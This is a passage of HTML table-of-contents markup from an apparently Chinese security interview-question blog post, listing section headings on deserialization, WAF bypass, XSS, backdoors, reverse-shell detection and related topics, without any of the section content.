href="#%E7%A4%BA%E4%BE%8B%E4%BB%A3%E7%A0%81%EF%BC%9A-5"><span class="toc-number">4.12.1.</span> <span class="toc-text">示例代码：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%92%8C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3%E7%9A%84-HTTP-%E5%93%8D%E5%BA%94%E5%A4%B4"><span class="toc-number">4.13.</span> <span class="toc-text">和信息安全相关的 HTTP 响应头</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WebLogic-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%9F%E7%90%86"><span class="toc-number">4.14.</span> <span class="toc-text">WebLogic 反序列化原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E9%A9%AC%E7%9B%B8%E5%85%B3%E5%8E%9F%E7%90%86"><span class="toc-number">4.15.</span> <span class="toc-text">内存马相关原理</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B%E4%BB%A3%E7%A0%81%EF%BC%9A-6"><span class="toc-number">4.15.1.</span> <span class="toc-text">示例代码：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Shiro-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%97%B6%E7%9A%84-WAF-%E7%BB%95%E8%BF%87"><span class="toc-number">4.16.</span> <span class="toc-text">Shiro 反序列化漏洞利用时的 WAF 绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B%E4%BB%A3%E7%A0%81%EF%BC%9A-7"><span class="toc-number">4.16.1.</span> <span class="toc-text">示例代码：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ysoserial-%E5%8E%9F%E7%90%86%E5%92%8C-CommonCollections-%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-number">4.17.</span> <span class="toc-text">ysoserial 原理和 CommonCollections 利用链</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B%E4%BB%A3%E7%A0%81%EF%BC%9A-8"><span class="toc-number">4.17.1.</span> <span class="toc-text">示例代码：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Java%E3%80%81PHP%E3%80%81Python-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E5%8C%BA%E5%88%AB%E5%92%8C%E7%9B%B8%E5%90%8C%E7%82%B9"><span class="toc-number">4.18.</span> <span class="toc-text">Java、PHP、Python 反序列化的区别和相同点</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">4.18.1.</span> <span class="toc-text">Java 反序列化</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PHP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">4.18.2.</span> <span class="toc-text">PHP 反序列化</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Python-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">4.18.3.</span> <span class="toc-text">Python 反序列化</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86"><span class="toc-number">4.19.</span> <span class="toc-text">宽字节注入原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Log4j-%E5%A6%82%E4%BD%95%E7%BB%95%E8%BF%87-trustcodebase"><span class="toc-number">4.20.</span> <span class="toc-text">Log4j 如何绕过 trustcodebase</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Springboot-Shiro-%E7%8E%AF%E5%A2%83%E5%A6%82%E4%BD%95%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F"><span class="toc-number">4.21.</span> <span class="toc-text">Springboot+Shiro 环境如何进行渗透</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E6%88%98%E4%B8%AD%E5%A6%82%E4%BD%95%E5%88%A4%E6%96%AD-Fastjson-%E7%9A%84%E7%89%88%E6%9C%AC"><span class="toc-number">4.22.</span> <span class="toc-text">实战中如何判断 Fastjson 的版本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Fastjson-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99-gadget"><span class="toc-number">4.23.</span> <span class="toc-text">Fastjson 文件读写 gadget</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E9%A9%AC%E7%B1%BB%E5%9E%8B%EF%BC%8C%E5%A6%82%E4%BD%95%E6%A3%80%E6%B5%8B"><span class="toc-number">4.24.</span> <span class="toc-text">内存马类型，如何检测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Spring4Shell-%E5%8E%9F%E7%90%86%E3%80%81%E6%A3%80%E6%B5%8B%E4%B8%8E%E5%88%A9%E7%94%A8"><span class="toc-number">4.25.</span> <span class="toc-text">Spring4Shell 原理、检测与利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">4.25.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A3%80%E6%B5%8B"><span class="toc-number">4.25.2.</span> <span class="toc-text">检测</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-number">4.25.3.</span> <span class="toc-text">利用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E5%8D%93%E7%B3%BB%E7%BB%9F%E5%A6%82%E4%BD%95%E8%BF%9B%E8%A1%8C-RCE"><span class="toc-number">4.26.</span> <span class="toc-text">安卓系统如何进行 RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF"><span class="toc-number">4.26.1.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B"><span class="toc-number">4.26.2.</span> <span class="toc-text">示例</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A7%BB%E5%8A%A8%E7%AB%AF-App-%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%98%AF-Cloud-%E7%8E%AF%E5%A2%83%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF"><span class="toc-number">4.27.</span> <span class="toc-text">移动端 App 服务端是 Cloud 环境的利用思路</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B-1"><span class="toc-number">4.27.1.</span> <span class="toc-text">示例</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Shiro-%E5%A6%82%E4%BD%95%E7%BB%95-WAF"><span class="toc-number">4.28.</span> <span class="toc-text">Shiro 如何绕 WAF</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF-1"><span class="toc-number">4.28.1.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B-2"><span class="toc-number">4.28.2.</span> <span class="toc-text">示例</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Weblogic-%E6%89%93%E7%AB%99%E9%81%87%E5%88%B0-WAF-%E7%9A%84%E6%93%8D%E4%BD%9C"><span class="toc-number">4.29.</span> <span class="toc-text">Weblogic 打站遇到 WAF 的操作</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF-2"><span class="toc-number">4.29.1.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B-3"><span class="toc-number">4.29.2.</span> <span class="toc-text">示例</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Jboss-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%9F%E7%90%86"><span class="toc-number">4.30.</span> <span class="toc-text">Jboss 反序列化原理</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-1"><span class="toc-number">4.30.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-1"><span class="toc-number">4.30.2.</span> <span class="toc-text">利用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Redis-%E6%94%BB%E5%87%BB%E3%80%81%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6%E5%8F%8A%E5%8E%9F%E7%90%86"><span class="toc-number">4.31.</span> <span class="toc-text">Redis 攻击、主从复制利用条件及原理</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95"><span class="toc-number">4.31.1.</span> <span class="toc-text">攻击方法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E5%8E%9F%E7%90%86"><span class="toc-number">4.31.2.</span> <span class="toc-text">主从复制原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-2"><span class="toc-number">4.31.3.</span> <span class="toc-text">利用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TCP-%E5%92%8C-UDP-%E4%B8%8D%E5%87%BA%E7%BD%91%E7%9A%84%E4%BB%A3%E7%90%86%E7%AD%96%E7%95%A5"><span class="toc-number">4.32.</span> <span class="toc-text">TCP 和 UDP 不出网的代理策略</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AD%96%E7%95%A5"><span class="toc-number">4.32.1.</span> <span class="toc-text">策略</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B-4"><span class="toc-number">4.32.2.</span> <span class="toc-text">示例</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%99%BE%E5%BA%A6"><span class="toc-number">5.</span> <span class="toc-text">百度</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#JSONP-%E5%8E%9F%E7%90%86%E5%8F%8A%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95"><span class="toc-number">5.1.</span> <span class="toc-text">JSONP 原理及绕过方法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#JSONP-%E5%8E%9F%E7%90%86"><span class="toc-number">5.1.1.</span> <span class="toc-text">JSONP 原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#JSONP-%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95"><span class="toc-number">5.1.2.</span> <span class="toc-text">JSONP 绕过方法</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DOM%E5%9E%8BXSS%E6%89%AB%E6%8F%8F%E5%99%A8%E7%BC%96%E5%86%99"><span class="toc-number">5.2.</span> <span class="toc-text">DOM型XSS扫描器编写</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E6%80%9D%E8%B7%AF"><span class="toc-number">5.2.1.</span> <span class="toc-text">基本思路</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E7%8E%B0%E6%AD%A5%E9%AA%A4"><span class="toc-number">5.2.2.</span> <span class="toc-text">实现步骤</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux%E4%B8%BB%E6%9C%BA%E7%95%99%E5%90%8E%E9%97%A8%E7%9A%84%E5%90%84%E7%A7%8D%E6%96%B9%E5%BC%8F"><span class="toc-number">5.3.</span> <span class="toc-text">Linux主机留后门的各种方式</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1"><span class="toc-number">5.3.1.</span> <span class="toc-text">计划任务</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%87%AA%E5%90%AF%E5%8A%A8%E5%90%8E%E9%97%A8"><span class="toc-number">5.3.2.</span> <span class="toc-text">自启动后门</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Webshell"><span class="toc-number">5.3.3.</span> <span class="toc-text">Webshell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%99%E6%B3%A8%E5%86%8C%E8%A1%A8%EF%BC%88Windows%EF%BC%89"><span class="toc-number">5.3.4.</span> <span class="toc-text">写注册表（Windows）</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DNS%E9%9A%A7%E9%81%93%E6%90%AD%E5%BB%BA%E6%96%B9%E5%BC%8F"><span class="toc-number">5.4.</span> <span class="toc-text">DNS隧道搭建方式</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86"><span class="toc-number">5.4.1.</span> <span class="toc-text">基本原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E7%8E%B0%E6%AD%A5%E9%AA%A4-1"><span class="toc-number">5.4.2.</span> <span class="toc-text">实现步骤</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A5%87%E5%AE%89%E4%BF%A1"><span class="toc-number">6.</span> <span class="toc-text">奇安信</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL-%E6%B3%A8%E5%85%A5%E5%86%99%E9%A9%AC%E7%9A%84%E6%96%B9%E5%BC%8F"><span class="toc-number">6.1.</span> <span class="toc-text">SQL 注入写马的方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Oracle-%E6%B3%A8%E5%85%A5%E7%9A%84%E7%9B%B4%E6%8E%A5%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-number">6.2.</span> <span class="toc-text">Oracle 注入的直接利用方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL-Server-%E8%8E%B7%E5%8F%96-shell-%E7%9A%84%E6%96%B9%E6%B3%95"><span class="toc-number">6.3.</span> <span class="toc-text">SQL Server 获取 shell 的方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F"><span class="toc-number">6.4.</span> <span class="toc-text">同源策略的绕过方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E5%9F%BA%E4%BA%8E%E8%AF%AD%E4%B9%89%E6%A3%80%E6%B5%8B%E7%9A%84-WAF"><span class="toc-number">6.5.</span> <span class="toc-text">绕过基于语义检测的 WAF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%84%E7%BC%96%E8%AF%91%E5%9C%BA%E6%99%AF%E4%B8%8B%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8-SQL-%E6%B3%A8%E5%85%A5"><span class="toc-number">6.6.</span> <span class="toc-text">预编译场景下是否存在 SQL 注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CDN-%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F"><span class="toc-number">6.7.</span> <span class="toc-text">CDN 的绕过方式</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BF%AB%E6%89%8B"><span class="toc-number">7.</span> <span class="toc-text">快手</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-SQL%E9%97%AE%E9%A2%98%EF%BC%9A%E5%A6%82%E4%BD%95%E5%8F%96%E5%9C%A8A%E4%B8%AD%E4%BD%86%E4%B8%8D%E5%9C%A8B%E4%B8%AD%E7%9A%84%E6%95%B0%E6%8D%AE"><span class="toc-number">7.1.</span> <span class="toc-text">1. SQL问题：如何取在A中但不在B中的数据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%9C%89%E5%A0%A1%E5%9E%92%E6%9C%BA%E6%80%8E%E4%B9%88%E5%8A%9E%EF%BC%9F"><span class="toc-number">7.2.</span> <span class="toc-text">2. 有堡垒机怎么办？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E8%A2%ABban-IP%E6%80%8E%E4%B9%88%E5%8A%9E%EF%BC%9F"><span class="toc-number">7.3.</span> <span class="toc-text">3. 被ban IP怎么办？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E7%99%BB%E5%BD%95%E5%81%9A%E4%BA%86%E5%8F%8C%E5%9B%A0%E7%B4%A0%E8%AE%A4%E8%AF%81%E6%80%8E%E4%B9%88%E5%8A%9E%EF%BC%9F"><span class="toc-number">7.4.</span> <span class="toc-text">4. 登录做了双因素认证怎么办？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-VPN%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%B2%A1%E7%BB%91%E5%AE%9A%E6%9C%BA%E5%99%A8%E7%BC%96%E7%A0%81%EF%BC%88%E8%AF%81%E4%B9%A6%EF%BC%89%E5%90%97%EF%BC%9F"><span class="toc-number">7.5.</span> <span class="toc-text">5. VPN服务器没绑定机器编码（证书）吗？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-00%E6%88%AA%E6%96%AD%E7%9A%84%E5%8E%9F%E7%90%86"><span class="toc-number">7.6.</span> <span class="toc-text">1. %00截断的原理</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF"><span class="toc-number">7.6.1.</span> <span class="toc-text">常见应用场景</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B%E4%BB%A3%E7%A0%81"><span class="toc-number">7.6.2.</span> <span class="toc-text">示例代码</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-SQL%E7%9B%B2%E6%B3%A8%E7%9A%84%E8%AF%AD%E5%8F%A5"><span class="toc-number">7.7.</span> <span class="toc-text">2. SQL盲注的语句</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-number">7.7.1.</span> <span class="toc-text">布尔盲注</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">7.7.2.</span> <span class="toc-text">时间盲注</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-XSS%E8%8E%B7%E5%8F%96cookie%E7%9A%84payload"><span class="toc-number">7.8.</span> <span class="toc-text">3. XSS获取cookie的payload</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AE%80%E5%8D%95payload"><span class="toc-number">7.8.1.</span> <span class="toc-text">简单payload</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%BC%E5%AE%B9%E6%97%A7%E6%B5%8F%E8%A7%88%E5%99%A8%E7%9A%84payload"><span class="toc-number">7.8.2.</span> <span class="toc-text">兼容旧浏览器的payload</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9B%B4%E9%9A%90%E8%94%BD%E7%9A%84payload"><span class="toc-number">7.8.3.</span> <span class="toc-text">更隐蔽的payload</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL-Server%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E6%96%B9%E6%B3%95"><span class="toc-number">7.9.</span> <span class="toc-text">SQL Server命令执行的方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E5%BC%95%E5%8F%B7%E7%BB%95%E8%BF%87"><span class="toc-number">7.10.</span> <span class="toc-text">SQL注入引号绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E8%AF%BB%E6%96%87%E4%BB%B6%E5%92%8C%E5%86%99%E6%96%87%E4%BB%B6"><span class="toc-number">7.11.</span> <span class="toc-text">SQL注入读文件和写文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E4%BF%AE%E5%A4%8D"><span class="toc-number">7.12.</span> <span class="toc-text">SQL注入的修复</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux%E5%91%BD%E4%BB%A4"><span class="toc-number">7.13.</span> <span class="toc-text">Linux命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90777"><span class="toc-number">7.14.</span> <span class="toc-text">Linux文件权限777</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows%E5%91%BD%E4%BB%A4"><span class="toc-number">7.15.</span> <span class="toc-text">Windows命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HTTPS%E5%BB%BA%E7%AB%8B%E8%BF%87%E7%A8%8B"><span class="toc-number">7.16.</span> <span class="toc-text">HTTPS建立过程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Python%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86"><span class="toc-number">7.17.</span> <span class="toc-text">Python内存管理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BA%AF%E6%BA%90%E6%94%BB%E5%87%BB%E7%A4%BA%E4%BE%8B"><span class="toc-number">7.18.</span> <span class="toc-text">溯源攻击示例</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DNS%E5%8D%8F%E8%AE%AE%E7%9A%84%E4%BD%9C%E7%94%A8%E4%B8%8E%E8%A7%A3%E6%9E%90%E8%BF%87%E7%A8%8B"><span class="toc-number">7.19.</span> <span class="toc-text">DNS协议的作用与解析过程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DNS%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98"><span class="toc-number">7.20.</span> <span class="toc-text">DNS协议的安全问题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%A6%E5%A4%96COKIES%E9%81%87%E5%88%B0WAF%E7%9A%84%E5%BA%94%E5%AF%B9"><span class="toc-number">7.21.</span> <span class="toc-text">带外COKIES遇到WAF的应对</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AWVS%E7%99%BB%E5%BD%95%E6%89%AB%E6%8F%8F%E6%93%8D%E4%BD%9C"><span class="toc-number">7.22.</span> <span class="toc-text">AWVS登录扫描操作</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQLMAP%E4%BD%BF%E7%94%A8"><span class="toc-number">7.23.</span> <span class="toc-text">SQLMAP使用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NMAP%E6%89%AB%E6%8F%8F%E5%91%BD%E4%BB%A4"><span class="toc-number">7.24.</span> <span class="toc-text">NMAP扫描命令</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%9A%82%E8%9A%81"><span class="toc-number">8.</span> <span class="toc-text">蚂蚁</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E7%BB%99AFL%E5%81%9A%E9%80%82%E9%85%8D%E5%8E%BBfuzz%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">8.1.</span> <span class="toc-text">如何给AFL做适配去fuzz数据库</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-AFL%E9%80%82%E9%85%8D%E6%95%B0%E6%8D%AE%E5%BA%93fuzz"><span class="toc-number">8.1.1.</span> <span class="toc-text">1. AFL适配数据库fuzz</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-fuzz%E6%B5%81%E7%A8%8B"><span class="toc-number">8.1.2.</span> <span class="toc-text">2. fuzz流程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-AFL%E7%9A%84%E6%8F%92%E6%A1%A9%E5%8E%9F%E7%90%86"><span class="toc-number">8.1.3.</span> <span class="toc-text">3. AFL的插桩原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E9%80%89%E6%8B%A9fuzz%E6%B5%8B%E8%AF%95%E7%82%B9"><span class="toc-number">8.1.4.</span> <span class="toc-text">4. 选择fuzz测试点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-%E6%95%B0%E6%8D%AE%E5%BA%93fuzz%E5%92%8C%E6%99%AE%E9%80%9A%E7%A8%8B%E5%BA%8Ffuzz%E7%9A%84%E4%B8%8D%E5%90%8C"><span class="toc-number">8.1.5.</span> <span class="toc-text">5. 数据库fuzz和普通程序fuzz的不同</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B%E4%BB%A3%E7%A0%81%EF%BC%9AAFL%E9%80%82%E9%85%8D%E6%95%B0%E6%8D%AE%E5%BA%93fuzz"><span class="toc-number">8.2.</span> <span class="toc-text">示例代码：AFL适配数据库fuzz</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E7%BC%96%E5%86%99%E6%B5%8B%E8%AF%95%E7%94%A8%E4%BE%8B%E7%94%9F%E6%88%90%E5%99%A8"><span class="toc-number">8.2.1.</span> <span class="toc-text">1. 编写测试用例生成器</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E8%AE%BE%E7%BD%AEAFL%E7%8E%AF%E5%A2%83"><span class="toc-number">8.2.2.</span> <span class="toc-text">2. 设置AFL环境</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E7%9B%91%E6%8E%A7%E5%92%8C%E5%88%86%E6%9E%90%E7%BB%93%E6%9E%9C"><span class="toc-number">8.2.3.</span> <span class="toc-text">3. 监控和分析结果</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91%E5%B7%A5%E7%A8%8B%E5%B8%88"><span class="toc-number">9.</span> <span class="toc-text">安全开发工程师</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E6%9F%A5%E7%9C%8B%E8%87%AA%E5%B7%B1%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%9F%90%E4%B8%AA%E7%AB%AF%E5%8F%A3%E6%83%85%E5%86%B5"><span class="toc-number">9.1.</span> <span class="toc-text">如何查看自己服务器某个端口情况</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E6%9F%A5%E7%9C%8B%E8%BF%9C%E7%A8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%83%85%E5%86%B5"><span class="toc-number">9.2.</span> <span class="toc-text">如何查看远程服务器情况</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9-shell-%E5%A6%82%E4%BD%95%E6%A3%80%E6%B5%8B"><span class="toc-number">9.3.</span> <span class="toc-text">反弹 shell 如何检测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E6%9E%9C%E6%94%BB%E5%87%BB%E8%80%85%E4%BD%BF%E7%94%A8%E4%BA%86-AWK%EF%BC%8C%E5%A6%82%E4%BD%95%E6%A3%80%E6%B5%8B"><span class="toc-number">9.4.</span> <span class="toc-text">如果攻击者使用了 AWK，如何检测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%99%A4%E4%BA%86%E8%BF%9B%E7%A8%8B%E6%A0%91%E7%9A%84%E5%91%BD%E4%BB%A4%E5%8C%B9%E9%85%8D%EF%BC%8C%E8%BF%98%E6%9C%89%E5%8F%AF%E4%BB%A5%E6%A3%80%E6%B5%8B%E5%8F%8D%E5%BC%B9-shell-%E7%9A%84%E6%96%B9%E6%B3%95%E5%90%97%EF%BC%9F"><span class="toc-number">9.5.</span> <span class="toc-text">除了进程树的命令匹配，还有可以检测反弹 shell 的方法吗？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%A0%E4%BA%86%E8%A7%A3%E5%93%AA%E4%BA%9B%E6%8F%90%E6%9D%83%E6%89%8B%E6%AE%B5%EF%BC%9F"><span class="toc-number">9.6.</span> <span class="toc-text">你了解哪些提权手段？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF-SUID-%E6%8F%90%E6%9D%83"><span class="toc-number">9.7.</span> <span class="toc-text">什么是 SUID 提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" 